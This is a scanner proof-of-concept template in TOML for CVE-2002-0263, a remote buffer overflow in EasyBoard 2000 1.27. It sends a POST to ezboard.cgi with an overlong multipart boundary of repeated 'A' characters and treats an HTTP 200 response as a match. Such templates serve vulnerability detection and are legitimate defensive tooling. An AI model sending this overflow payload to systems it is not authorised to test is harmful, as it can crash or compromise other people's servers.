[info]
author = "ave"
description = "验证目标是否存在 EasyBoard 2000 1.27 远程缓冲区溢出漏洞，通过发送包含超长 boundary 值的 multipart Content-Type 请求头触发"
id = "POC-AVE-2002-0235"
name = "CVE-2002-0263 PoC"
severity = "high"
tags = ["ave-2002-0235"]
vuln_id = [
    "CVE-2002-0263",
    "AVE-2002-0235",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/ezboard.cgi"
protocol = "http"

[poc.requests.body]
content = """
--AVE-2002-0235-TEST-BOUNDARY-VALUE-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r
Content-Disposition: form-data; name="file"; filename="test.txt"\r
Content-Type: application/octet-stream\r
\r
test\r
--AVE-2002-0235-TEST-BOUNDARY-VALUE-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA--\r
"""
type = "raw"

[poc.requests.headers]
Content-Type = "multipart/form-data; boundary=AVE-2002-0235-TEST-BOUNDARY-VALUE-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
